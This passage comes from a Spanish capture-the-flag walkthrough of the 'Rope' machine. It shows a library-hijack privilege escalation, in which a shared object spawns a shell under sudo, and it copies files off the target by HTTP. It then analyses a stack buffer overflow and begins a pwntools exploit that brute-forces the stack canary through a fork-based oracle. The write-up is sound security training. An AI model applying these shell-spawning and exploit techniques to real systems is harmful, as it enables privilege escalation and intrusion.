</code></pre></div><p>La idea es secuestrar la ejecuci贸n del programa una vez que se cargue la librer铆a, de ah铆 que se defina la funci贸n <code>_init</code>. Sin embargo, tenemos que definir una funci贸n llamada <code>printlog</code>, porque es usada por el binario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">john@rope:/tmp$ sudo -u r4j /usr/bin/readlogs
/usr/bin/readlogs: symbol lookup error: /usr/bin/readlogs: undefined symbol: printlog  
</code></pre></div><p>Pues vamos a cambiar <code>_init</code> por <code>printlog</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">john@rope:/tmp$ vim lib.c
john@rope:/tmp$ cat lib.c
#include &lt;unistd.h&gt;

void printlog() {
    char *argv[] = {"/bin/sh", 0};
    execve(argv[0], &argv[0], NULL);
}
john@rope:/tmp$ gcc -shared -fpic lib.c -o /lib/x86_64-linux-gnu/liblog.so  
</code></pre></div><p>Y ya tenemos una <em>shell</em> como <code>r4j</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">john@rope:/tmp$ sudo -u r4j /usr/bin/readlogs  
$ whoami
r4j
$ bash
r4j@rope:/tmp$ cd /home/r4j
r4j@rope:/home/r4j$ cat user.txt
e81294485fad64644230fc9397b127f8
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Este usuario pertenece al grupo <code>adm</code>. Si miramos los archivos que pertenecen a este grupo, vemos uno sospechoso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">r4j@rope:/tmp$ id
uid=1000(r4j) gid=1000(r4j) groups=1000(r4j),4(adm)  
r4j@rope:/tmp$ find / -group adm 2>/dev/null
/opt/support
/opt/support/contact
/var/spool/rsyslog
/var/log/unattended-upgrades
/var/log/kern.log
/var/log/syslog
/var/log/cloud-init.log
/var/log/apt/term.log
/var/log/auth.log
/snap/core/7270/var/log/dmesg
/snap/core/7270/var/log/fsck/checkfs
/snap/core/7270/var/log/fsck/checkroot
/snap/core/7270/var/spool/rsyslog
/snap/core/6964/var/log/dmesg
/snap/core/6964/var/log/fsck/checkfs
/snap/core/6964/var/log/fsck/checkroot
/snap/core/6964/var/spool/rsyslog
</code></pre></div><p>S铆, se trata de <code>/opt/support/contact</code>, que es otro archivo binario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">r4j@rope:/tmp$ ls -l /opt/support/contact
-rwxr-x--- 1 root adm 14632 Jun 19  2019 /opt/support/contact
r4j@rope:/tmp$ file /opt/support/contact
/opt/support/contact: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cc3b330cabc203d0d813e3114f1515b044a1fd4f, stripped  
</code></pre></div><h3 id="analizando-el-binario-contact">Analizando el binario <code>contact</code></h3><p>Si tratamos de ejecutarlo, vemos un error:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">r4j@rope:/tmp$ /opt/support/contact  
ERROR: Address already in use
</code></pre></div><p>Por tanto, podemos pensar que el binario ya est谩 en ejecuci贸n. De hecho, si enumeramos los puertos locales abiertos, vemos que hay un proceso a la escucha en el puerto 1337:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">r4j@rope:/tmp$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN
tcp        0    138 10.10.10.148:43178      10.10.17.44:4444        ESTABLISHED  
tcp6       0      0 :::22                   :::*                    LISTEN
</code></pre></div><p>Luego, podemos listar procesos y ver que <code>/opt/support/contact</code> est谩 en ejecuci贸n como usuario <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">r4j@rope:/tmp$ ps -faux | tail
r4j       1973  0.0  0.2  19680  4536 pts/0    S    Jul19   0:00  |                                                   \_ bash
r4j       2319  0.0  0.1  36856  3324 pts/0    R+   00:09   0:00  |                                                       \_ ps -faux  
r4j       2320  0.0  0.0   4568   848 pts/0    S+   00:09   0:00  |                                                       \_ tail
root      1126  0.0  0.1  57500  3148 ?        S    Jul19   0:00  \_ /usr/sbin/CRON -f
root      1194  0.0  0.0   4628   804 ?        Ss   Jul19   0:00      \_ /bin/sh -c /opt/support/contact
root      1196  0.0  0.0   4516   704 ?        S    Jul19   0:00          \_ /opt/support/contact
syslog    1102  0.0  0.2 267272  5112 ?        Ssl  Jul19   0:00 /usr/sbin/rsyslogd -n
root      1116  0.0  0.3 288876  6444 ?        Ssl  Jul19   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1148  0.0  0.0  14888  1924 tty1     Ss+  Jul19   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root      1167  0.0  0.2  72296  5588 ?        Ss   Jul19   0:00 /usr/sbin/sshd -D
</code></pre></div><p>Vamos a descargar el binario a nuestra m谩quina de atacante para analizarlo con Ghidra:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">r4j@rope:/tmp$ which python3
/usr/bin/python3
r4j@rope:/tmp$ cd /opt/support/
r4j@rope:/opt/support$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
10.10.17.44 - - [] "GET /contact HTTP/1.1" 200 -
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> 10.10.10.148:8000/contact  
</code></pre></div><p>Lo primero de todo, el binario est谩 protegido casi al completo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">checksec</span> <span class="mtku">contact</span>
[<span class="code-blue">*</span>] './contact'
    Arch:     amd64-64-little  
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled
</code></pre></div><p>En Ghidra, vemos la funci贸n <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">socklen_t</span><span class="mtk1"> local_40;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> port;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> local_38;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> local_34;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_30;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> local_2c;</span>
<span class="mtk1">  sockaddr local_28;</span>
<span class="mtk1">  undefined8 canary;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  port </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">1337</span><span class="mtk1">;</span>
<span class="mtk1">  local_40 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">;</span>
<span class="mtk1">  local_38 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">FUN_00101267</span><span class="mtk1">(</span><span class="mtk6">1337</span><span class="mtk1">);</span>
<span class="mtk1">  local_34 </span><span class="mtk5">=</span><span class="mtk1"> local_38;</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_38) {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"listen on port </span><span class="mtk6">%d</span><span class="mtk4">, fd is </span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) port, (ulong) local_38);</span>  
<span class="mtk1">    </span><span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">d</span><span class="mtk1">, (</span><span class="mtk7 mtki">__sighandler_t</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">, (</span><span class="mtk7 mtki">__sighandler_t</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">1</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">        local_30 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">accept</span><span class="mtk1">(local_38, </span><span class="mtk5">&amp;</span><span class="mtk1">local_28, </span><span class="mtk5">&amp;</span><span class="mtk1">local_40);</span>
<span class="mtk1">      } </span><span class="mtk5">while</span><span class="mtk1"> (local_30 </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">      local_2c </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">process</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (local_2c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk8">close</span><span class="mtk1">(local_30);</span>
<span class="mtk1">    }</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">  </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"ERROR"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(local_38);</span>
<span class="mtk1">}</span>
</code></pre></div><p>De nuevo, se trata de un servidor de <em>sockets</em> que escucha en el puerto 1337. Cuando llega una conexi贸n, se pasa a la funci贸n <code>process</code> (renombrada de <code>FUN_001014ee</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">__pid_t</span><span class="mtk1"> </span><span class="mtk8">process</span><span class="mtk1">(</span><span class="mtk7 mtki">uint</span><span class="mtk1"> </span><span class="mtk9 mtki">param_1</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">__pid_t</span><span class="mtk1"> _Var2;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">__uid_t</span><span class="mtk1"> _Var3;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> __n;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  _Var2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fork</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (_Var2 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    _Var3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getuid</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+] Request accepted fd </span><span class="mtk6">%d</span><span class="mtk4">, pid </span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) param_1, (ulong)_Var3);</span>  
<span class="mtk1">    __n </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(s_Please_enter_the_message_you_wan_001040e0);</span>
<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(param_1, s_Please_enter_the_message_you_wan_00104</span><span class="mtk1">0e0, __n);</span>
<span class="mtk1">    </span><span class="mtk8">vuln</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">send</span><span class="mtk1">(param_1, </span><span class="mtk4">"Done.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">6</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">    _Var2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> _Var2;</span>
<span class="mtk1">}</span>
</code></pre></div><p>B谩sicamente, imprime mensajes a <code>stdout</code> y luego va a <code>vuln</code> (renombrada de <code>FUN_0010159a</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">vuln</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">param_1</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  undefined local_48[</span><span class="mtk6">56</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">recv</span><span class="mtk1">(param_1, local_48, </span><span class="mtk5">0x</span><span class="mtk6">400</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Obviamente, si le he puesto de nombre <code>vuln</code> es porque hay la funci贸n es vulnerable. En efecto, existe una vulnerabilidad de <em>Buffer Overflow</em> ya que <code>local_48</code> tiene 56 bytes asignados como <em>buffer</em> y <code>recv</code> lee hasta <code>0x400</code> (512) bytes y los guarda en <code>local_48</code>. Podemos probarlo en local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./contact</span>
listen on port 1337, fd is 3  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 127.0.0.1 1337
Please enter the message you want to send to admin:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./contact</span>
listen on port 1337, fd is 3
[+] Request accepted fd 4, pid 1000
*** stack smashing detected ***: terminated  
</code></pre></div><p>No vemos un mensaje de violaci贸n de segmento (<em>segmentation fault</em>), pero s铆 vemos un <code>*** stack smashing detected ***</code>, que se debe a la protecci贸n del canario.</p><h3 id="explotaci贸n-de-_buffer-overflow_">Explotaci贸n de <em>Buffer Overflow</em></h3><p>Vamos a dar un poco de contexto. El canario de la pila (<em>stack canary</em>) es un valor aleatorio calculado al comienzo del programa que se guarda en la pila antes de las copias de <code>$rbp</code> y <code>$rip</code>. Cuando una funci贸n va a retornar, el programa mira si el valor del canario en la pila coincide con el que calcul贸 el programa en el inicio (que est谩 guardado en una zona segura). Si los valores son diferentes, el programa asume que ha ocurrido un ataque de <em>Buffer Overflow</em> (<em>stack smashing</em>) y fuerza el fin de la ejecuci贸n del programa (<code>__stack_chk_fail</code>). Si no, el programa sigue.</p><p>Por tanto, para evitar esta protecci贸n, lo que tenemos que hacer es obtener el valor del canario de alguna manera (que se calcula en tiempo de ejecuci贸n, por lo que cambia cada vez que se reinicia el programa). Luego, tendremos que ponerlo en nuestro <em>payload</em>, de manera que sobrescribimos el canario con el mismo valor y el programa no se dar谩 cuenta de la explotaci贸n de <em>Buffer Overflow</em>.</p><p>驴Pero c贸mo podemos afrontar esto? Bueno, estamos ante un servidor de <em>sockets</em> que usa <code>fork</code> cada vez que llega una nueva conexi贸n, por lo que todo el mapa de memoria se copia del proceso padre al proceso hijo. Esto significa que el proceso que se rompe es el hijo, el padre sigue esperando nuevas conexiones. Adem谩s, el canario de la pila est谩 configurado en el proceso padre, y se copia en el hijo. Podemos obtener el valor del canario car谩cter a car谩cter usando lo que se conoce como or谩culo.</p><p>Primero de todo, vamos a descargar la librer铆a Glibc y el <em>loader</em> de la m谩quina remota para tener el mismo <em>exploit</em> en local y en remoto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">r4j@rope:/opt/support$ cd /
r4j@rope:/$ ldd /opt/support/contact
        linux-vdso.so.1 (0x00007ffccd8fa000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1bc9c6b000)  
        /lib64/ld-linux-x86-64.so.2 (0x00007f1bca05c000)
r4j@rope:/$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.17.44 - - [] "GET /lib/x86_64-linux-gnu/libc.so.6 HTTP/1.1" 200 -
10.10.17.44 - - [] "GET /lib64/ld-linux-x86-64.so.2 HTTP/1.1" 200 -
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.10.148:8000/lib/x86_64-linux-gnu/libc.so.6  

<span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.10.148:8000/lib64/ld-linux-x86-64.so.2
</code></pre></div><p>Usando <a href="https://github.com/io12/pwninit"><code>pwninit</code></a> podemos parchear el binario para que use la librer铆a y el <em>loader</em> indicados:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwninit</span> --libc <span class="mtku">libc.so.6</span> --ld <span class="mtku">ld-linux-x86-64.so.2</span> --bin <span class="mtku">contact</span> --no-template
<span class="code-dark-blue">bin</span>: <span class="code-blue">contact</span>
<span class="code-dark-yellow">libc</span>: <span class="code-yellow">libc.so.6</span>
<span class="code-dark-green">ld</span>: <span class="code-green">ld-linux-x86-64.so.2</span>

<span class="code-yellow">unstripping libc</span>
<span class="code-green">https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1_amd64.deb</span>  
<span class="code-dark-green">setting <span class="code-green">ld-linux-x86-64.so.2<span class="code-dark-green"> executable</span>
<span class="code-dark-green">copying <span class="code-green">contact<span class="code-dark-green"> to <span class="code-green">contact_patched</span>
<span class="code-dark-green">running patchelf on <span class="code-green">contact_patched
</code></pre></div><p>Ahora tenemos <code>contact_patched</code>, que se comportar谩 de manera igual al binario remoto.</p><p>Vamos a comenzar por obtener el n煤mero de bytes necesarios para acontecer la vulnerabilidad de <em>Buffer Overflow</em>. Una manera de hacer esto es matem谩ticamente (como <code>local_48</code> tiene 56 bytes asignados, significa que los siguientes 8 bytes ser谩n para el canario de la pila, luego el valor guardado de <code>$rbp</code> y luego el valor guardado de <code>$rip</code> o direcci贸n de retorno).</p><p>Vamos a probarlo. Si introducimos exactamente 56 byte, todo est谩 OK:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'import os; os.write(1, b"A" * 56)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1337  
Please enter the message you want to send to admin:
Done.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./contact_patched</span>
listen on port 1337, fd is 3
[+] Request accepted fd 4, pid 1000  
</code></pre></div><p>Vamos a introducir uno nuevo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'import os; os.write(1, b"A" * 57)'</span> | <span class="code-dark-green">nc</span> 127.0.0.1 1337  
Please enter the message you want to send to admin:
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./contact_patched</span>
listen on port 1337, fd is 3
[+] Request accepted fd 4, pid 1000
*** stack smashing detected ***: &lt;unknown&gt; terminated  
</code></pre></div><p>Bien, ya sabemos d贸nde comienza el canario. 驴Puedes ver alguna diferencia m谩s en las respuestas? S铆, 隆tenemos un or谩culo! Si el canario no se modifica, el servidor responde <code>Done.</code>, y si no, no responde. Entonces tenemos una manera de hacer fuerza bruta car谩cter a car谩cter hasta que tengamos un mensaje <code>Done.</code>, que significa que el byte probado es correcto y podemos pasar al siguiente byte del canario, hasta obtenerlo al completo.</p><h3 id="obteniendo-fugas-de-memoria">Obteniendo fugas de memoria</h3><p>Podemos comenzar a escribir el <em>exploit</em> en Python con <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">elf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'contact'</span><span class="mtk1">)</span>
<span class="mtk1">glibc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'libc.so.6'</span><span class="mtk1">, </span><span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Usage: python3 </span><span class="mtk6">{</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span><span class="mtk6">}</span><span class="mtk4"> &lt;ip:port&gt;'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">56</span>
<span class="mtk1">    </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">canary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span>
